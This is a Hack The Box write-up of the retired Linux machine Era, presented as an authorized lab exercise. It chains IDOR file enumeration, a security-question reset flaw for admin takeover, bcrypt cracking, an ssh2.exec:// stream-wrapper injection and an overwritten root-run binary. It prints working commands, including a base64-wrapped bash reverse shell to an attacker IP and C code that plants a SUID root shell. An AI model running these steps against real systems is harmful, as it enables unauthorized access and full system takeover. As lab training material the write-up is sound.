---
title: "Hack The Box — Era"
summary: "An IDOR exposes a site backup; a security-question reset grants admin access, SSH2 stream execution yields a shell, and a writable signed ELF grants root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Medium"
os: "Linux"
solvedAt: 2026-11-12
publishedAt: 2026-11-12
tags:
  - enumeration
  - idor
  - source-disclosure
  - account-takeover
  - php-stream-wrappers
  - password-cracking
  - privilege-escalation
  - cron
tools:
  - Nmap
  - ffuf
  - curl
  - SQLite
  - John the Ripper
  - Burp Suite
  - GCC
  - objcopy
cves: []
htbUrl: "https://app.hackthebox.com/machines/Era"
cover: "/images/writeups/hackthebox/machines/era/era.png"
coverAlt: "Hack The Box Era machine logo showing stone figures around a laptop inside an orange ring"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. Era is described as a [retired machine in a public exploit release](https://ge.linkedin.com/in/aleksandr-petrushchenkov-6977a91a0/en); Hack The Box [permits community write-ups for retired Machines](https://help.hackthebox.com/en/articles/5185338-how-to-play-machines-on-hack-the-box). Flag values, session cookies, private keys, personal VPN addresses and unrelated secrets are omitted. The lab-only `eric:america` credential is included because it is required to reproduce the path.

## Executive summary

Era exposes a file-sharing application on a virtual host. Numbered download IDs can be accessed across accounts, and one ID returns a backup containing the PHP source and SQLite database. An authenticated security-question reset trusts a submitted username, letting an ordinary user replace the administrator's answers and log in as admin. The admin-only preview feature prepends an attacker-controlled PHP stream wrapper to a file path. With a cracked lab password and the `ssh2.exec://` wrapper, opening that stream executes a command through the target's localhost SSH service and yields an `eric` shell. Finally, `eric` can overwrite a root-owned monitor binary through the `devs` group. Copying the original `.text_sig` section into a replacement ELF satisfies the observed signature check, and the scheduled root execution creates a root-owned SUID shell.

## Target information

| Item | Value |
| --- | --- |
| Target | Era (`era.htb`, `file.era.htb`) |
| Platform | Hack The Box |
| Difficulty | Medium |
| Operating system | Linux |
| Publication policy | [Retired](https://ge.linkedin.com/in/aleksandr-petrushchenkov-6977a91a0/en) |
| Main weaknesses | Insecure direct object reference, broken authorization in security-question reset, unsafe PHP stream wrapper, writable privileged binary |

Use the IPs assigned to **your** lab instance and VPN session. The numbers in another player's session will differ:

```bash
export TARGET_IP='<YOUR_HTB_TARGET_IP>'
export ATTACKER_IP='<YOUR_HTB_VPN_IP>'
echo "$TARGET_IP era.htb file.era.htb" | sudo tee -a /etc/hosts
```

## Enumeration

### TCP services and virtual host

The full TCP scan found FTP and HTTP. A focused follow-up confirmed SSH was closed from the attack machine, a detail that matters later because the application can still reach a localhost SSH service:

```bash
nmap -sC -sV -p- "$TARGET_IP"
nmap -sV -p22 "$TARGET_IP"
```

```text
21/tcp open  ftp   vsftpd 3.0.5
80/tcp open  http  nginx 1.18.0 (Ubuntu)
22/tcp closed ssh
```

The web server redirected to `http://era.htb/`. Its landing page was largely static; `/robots.txt` returned 404, and FTP refused anonymous login. A virtual-host scan then identified a different application:

```bash
ffuf -u "http://$TARGET_IP/" \
  -H 'Host: FUZZ.era.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac
```

```text
file  [Status: 200, Size: 6765]
```

Browsing `http://file.era.htb/` revealed **Era Storage**, with registration, login, file upload, file management, and an alternative login using security questions. A focused path scan showed the important endpoints:

```bash
ffuf -u 'http://file.era.htb/FUZZ' \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.txt,.bak -ac
```

| Path | Observation |
| --- | --- |
| `/register.php`, `/login.php` | Create and authenticate an ordinary account. |
| `/upload.php`, `/manage.php` | Authenticated file operations. |
| `/download.php` | Takes a numeric `id`; redirects an unauthenticated visitor. |
| `/files/` | Upload storage, without a useful direct listing. |

### Findings: download IDs cross account boundaries

Register a test account, sign in, and upload a harmless image through `/upload.php`. My upload returned a URL like `download.php?id=847`. The number is a database key, not a random capability. Visiting it while signed in displayed the filename and a link ending in `&dl=true`.

Record your own authenticated `PHPSESSID` from the browser or Burp and make an ID list up to your uploaded ID:

```bash
export USER_SID='<YOUR_ORDINARY_SESSION_COOKIE>'
export UPLOAD_ID='<ID_FROM_YOUR_UPLOAD_LINK>'
seq 1 "$UPLOAD_ID" > ids.txt

ffuf -u 'http://file.era.htb/download.php?id=FUZZ' \
  -w ids.txt \
  -b "PHPSESSID=$USER_SID" \
  -mr 'Your Download Is Ready' \
  -t 10 -rate 20
```

The response text matters more than HTTP status: nonexistent IDs also returned `200` with a “File Not Found” page. My run found IDs `54`, `150`, and my own `847`. Inspecting the first two while authenticated showed:

```text
54   site-backup-30-08-24.zip
150  signing.zip
```

This is an insecure direct object reference: the download handler retrieves a file by ID without checking that its `fileowner` matches the session user. Download the two archives through the documented `dl=true` branch. Keep the signing archive private; it contains a PEM key that is not needed for this route.

```bash
curl -fsS -b "PHPSESSID=$USER_SID" \
  'http://file.era.htb/download.php?id=54&dl=true' \
  -o site-backup-30-08-24.zip

curl -fsS -b "PHPSESSID=$USER_SID" \
  'http://file.era.htb/download.php?id=150&dl=true' \
  -o signing.zip

unzip -l site-backup-30-08-24.zip | head -40
mkdir -p backup
unzip -q site-backup-30-08-24.zip -d backup
```

The backup held `download.php`, `reset.php`, `security_login.php`, other application code, and `filedb.sqlite`. Its database snapshot identified the administrator as `admin_ef01cab31aa` with `user_id=1`; file ID `54` had `fileowner=1`.

```bash
sqlite3 -header -column backup/filedb.sqlite \
  'SELECT user_id, user_name FROM users;'

sqlite3 -header -column backup/filedb.sqlite \
  'SELECT fileid, filepath, fileowner FROM files WHERE fileid=54;'
```

## Initial access

### Replace the administrator's security answers

The source explains why simply trying answers from the backup is unreliable: it is a **snapshot**, and the live answers can have changed. In my lab, the saved admin answers were rejected by `/security_login.php`.

The useful flaw is in `reset.php`. It checks that a user is logged in, but its update targets the **posted username** rather than the authenticated account:

```php
$username = trim($_POST['username'] ?? '');
$query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
$stmt->bindValue(4, $username, SQLITE3_TEXT);
```

The query is parameterized, so this is not SQL injection. It is broken authorization: any authenticated account can choose another user's name. Send the request with your ordinary account cookie and three fresh answers of your choice:

```bash
curl -i -b "PHPSESSID=$USER_SID" \
  --data-urlencode 'username=admin_ef01cab31aa' \
  --data-urlencode 'new_answer1=LabMother47' \
  --data-urlencode 'new_answer2=LabPet47' \
  --data-urlencode 'new_answer3=LabCity47' \
  'http://file.era.htb/reset.php'
```

Then log in through `/security_login.php` as `admin_ef01cab31aa`, using those exact three answers in order. The source shows that a match sets `$_SESSION['erauser']` to the selected user's `user_id`. Verify that `/manage.php` lists the admin's files. If using `curl`, save the admin cookie to a local cookie jar:

```bash
curl -i -c admin.cookies \
  --data-urlencode 'username=admin_ef01cab31aa' \
  --data-urlencode 'answer1=LabMother47' \
  --data-urlencode 'answer2=LabPet47' \
  --data-urlencode 'answer3=LabCity47' \
  'http://file.era.htb/security_login.php'

curl -s -b admin.cookies 'http://file.era.htb/manage.php' |
  grep -E 'site-backup|signing'
```

### Trace the admin-only preview sink

The backup's `download.php` includes a second branch, reachable only when `show=true` and `$_SESSION['erauser'] === 1`. Its `format` parameter becomes a prefix to the stored filepath. When that prefix contains `://`, PHP treats it as a stream wrapper:

```php
if ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];
    $wrapper = strpos($format, '://') !== false ? $format : '';
    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
    echo "Opening: " . ($wrapper ? $wrapper . $file : $file) . "\n";
    echo $file_content;
}
```

The `fopen()` call is the important operation. `echo $file_content` merely prints a stream resource identifier; a response such as `Resource id #3` is **not** command output. Use a network callback or shell listener to confirm execution.

The `ssh2.exec://` wrapper can authenticate to the target's local SSH service and execute a command when opened. First, recover the lab credential from the backup. The `eric` entry contains a bcrypt hash; John found `america` in the installed wordlist:

```bash
sqlite3 -noheader backup/filedb.sqlite \
  "SELECT user_password FROM users WHERE user_name='eric';" > eric.hash

john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt eric.hash
john --show --format=bcrypt eric.hash
# ?:america
```

Start a listener in a separate Kali terminal:

```bash
nc -lvnp 4444
```

Build a reverse shell for **your** VPN address, encode it to avoid quoting problems, and URL-encode the `format` value with `curl`:

```bash
payload=$(printf 'bash -i >& /dev/tcp/%s/4444 0>&1' "$ATTACKER_IP" | base64 -w0)
format="ssh2.exec://eric:america@127.0.0.1:22/bash -c 'printf %s $payload | base64 -d | bash' x "

curl -s -b admin.cookies -G \
  --data-urlencode 'id=54' \
  --data-urlencode 'show=true' \
  --data-urlencode "format=$format" \
  'http://file.era.htb/download.php'
```

The stored `files/site-backup-30-08-24.zip` path is appended to the `format` value. In the command above, the trailing `x` becomes `$0` for `bash -c`, and the appended path becomes an unused positional argument. The PHP process reaches SSH on `127.0.0.1:22`, even though TCP/22 was closed externally. A successful callback lands as `eric`:

```text
connect to [<YOUR_HTB_VPN_IP>] from [<YOUR_HTB_TARGET_IP>]
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
eric@era:~$ cat ~/user.txt
[user flag obtained; value omitted]
```

## Privilege escalation

### A root-owned binary writable by `devs`

The `devs` group led to `/opt/AV/periodic-checks/`. Its monitor is owned by root but **group writable**, and `status.log` shows recurring scans:

```bash
id
ls -la /opt/AV/periodic-checks
file /opt/AV/periodic-checks/monitor
readelf -S /opt/AV/periodic-checks/monitor | grep -E 'text|sig'
tail -n 20 /opt/AV/periodic-checks/status.log
```

```text
-rwxrw---- 1 root devs ... monitor
[16] .text       PROGBITS ...
[28] .text_sig   PROGBITS ...
[*] System scan initiated...
[SUCCESS] No threats detected.
```

`readelf -x .text_sig` showed a separate signature-like section containing an ELF verification identity. We did not have to recover or reproduce its private key. The observed weakness was that the existing `.text_sig` section could be transplanted into a modified executable and the recurring privileged task still ran it. The precise checker implementation was not available from the `eric` account; the outcome demonstrates that its check did not bind the executed code to the signature bytes.

Keep a copy of the original and confirm the local build tools:

```bash
cp /opt/AV/periodic-checks/monitor /tmp/monitor.original
command -v gcc objcopy
objcopy --dump-section .text_sig=/tmp/era.sig /tmp/monitor.original
```

Create a minimal ELF that, when run by root, leaves a root-owned SUID Bash copy in `/tmp`:

```bash
cat > /tmp/era-monitor.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/era-rootbash && chmod 4755 /tmp/era-rootbash");
    return 0;
}
EOF

gcc -O2 -o /tmp/era-monitor /tmp/era-monitor.c
objcopy --add-section .text_sig=/tmp/era.sig \
  /tmp/era-monitor /tmp/era-monitor.signed
readelf -S /tmp/era-monitor.signed | grep .text_sig
```

Write the replacement **into** the existing monitor inode. This preserves its root ownership and permissions while replacing its bytes:

```bash
cat /tmp/era-monitor.signed > /opt/AV/periodic-checks/monitor
ls -l /opt/AV/periodic-checks/monitor
```

After the scheduled scan, the helper appeared with the SUID bit and root ownership. The status log's repeated scans established the task's cadence; the root-owned helper established that the altered monitor actually executed with root privileges:

```bash
ls -l /tmp/era-rootbash
# -rwsr-xr-x 1 root root ... /tmp/era-rootbash

/tmp/era-rootbash -p
whoami
# root
cat /root/root.txt
# [root flag obtained; value omitted]
```

The `-p` option tells Bash to preserve its effective UID. In a lab reset, the scheduled task and file changes are discarded. If you keep the same instance running, restore the original monitor and remove the temporary SUID helper when finished.

## What did not work

- Anonymous FTP login was denied, and `/robots.txt` revealed nothing useful.
- Security answers found in the backup failed against the live administrator account. The backup was stale; `reset.php` gave a more reliable account-takeover route.
- `expect://` only produced an `Opening:` line in the preview response, with no callback. It did not establish command execution in this environment.
- Early `ssh2.exec://` attempts using a `curl` callback produced a resource identifier but no HTTP request at the Kali listener. Encoding the Bash reverse shell and making the appended filepath an unused `bash -c` argument yielded the observed shell.
- The archive `signing.zip` contained key material, but the privilege escalation did not require publishing or using that private key.

## Attack path

1. Discover `file.era.htb` and register a normal account.
2. Enumerate numeric download IDs; download the cross-account site backup and inspect its PHP and SQLite files.
3. Use the unscoped security-question update in `reset.php` to set new admin answers, then log in as admin.
4. Crack `eric`'s lab bcrypt hash and combine the admin preview sink with `ssh2.exec://` to execute through localhost SSH.
5. From the `eric` shell, overwrite the `devs`-writable monitor with a new ELF carrying the old `.text_sig` section.
6. Let the scheduled root task run it, then use the resulting SUID Bash to read the root flag.

## Lessons learned

- A numeric file ID needs an ownership check on every read and download path. Authentication alone does not authorize access to another account's files.
- Password-recovery and security-question updates must bind the target account to the authenticated identity; a prepared SQL statement does not solve an authorization error.
- User-controlled PHP stream wrappers expand a file-preview feature into network and command-execution behavior. Allowlisted file types and canonical paths are safer than accepting arbitrary wrapper prefixes.
- A signature stored in an ELF section is meaningful only if the privileged checker verifies the exact executable bytes it will run. Privileged binaries must also be non-writable to unprivileged groups.
- The decisive evidence was the transition at each trust boundary: cross-account download, admin session, `eric` callback, and root-owned SUID file. A `200` status or a `Resource id` line alone would not prove exploitation.

## References

- [Hack The Box: How to Play Machines](https://help.hackthebox.com/en/articles/5185338-how-to-play-machines-on-hack-the-box) — retired content and community write-ups.
- [PHP manual: SSH2 stream wrappers](https://www.php.net/manual/en/wrappers.ssh2.php) — `ssh2.exec://` behavior.
- [PHP manual: `fopen()`](https://www.php.net/manual/en/function.fopen.php) — opening a stream resource.
- [GNU Binutils: `objcopy`](https://sourceware.org/binutils/docs/binutils/objcopy.html) — dumping and adding ELF sections.
- [Era walkthrough by Maksim Hayder](https://blog.maksimhayder.com/posts/era-htb/) — independent confirmation of the SSH2 wrapper and appended-path behavior. This article's tested observations and commands are based on my lab run.
